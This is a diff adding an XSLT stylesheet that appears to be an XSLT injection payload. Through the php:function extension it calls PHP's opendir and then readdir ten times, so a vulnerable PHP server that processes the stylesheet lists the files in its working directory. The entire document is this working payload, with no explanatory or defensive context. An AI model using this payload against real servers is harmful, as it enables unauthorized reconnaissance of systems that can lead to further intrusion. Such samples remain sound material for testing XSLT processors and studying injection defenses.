@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<xsl:template match="/">
+  <xsl:value-of select="php:function('opendir', '.')"/>
+  Dir List:
+  1. <xsl:value-of select="php:function('readdir')"/> | 
+  2. <xsl:value-of select="php:function('readdir')"/> | 
+  3. <xsl:value-of select="php:function('readdir')"/> | 
+  4. <xsl:value-of select="php:function('readdir')"/> | 
+  5. <xsl:value-of select="php:function('readdir')"/> | 
+  6. <xsl:value-of select="php:function('readdir')"/> | 
+  7. <xsl:value-of select="php:function('readdir')"/> | 
+  8. <xsl:value-of select="php:function('readdir')"/> | 
+  9. <xsl:value-of select="php:function('readdir')"/> | 
+  10. <xsl:value-of select="php:function('readdir')"/>
+</xsl:template>
+</xsl:stylesheet>
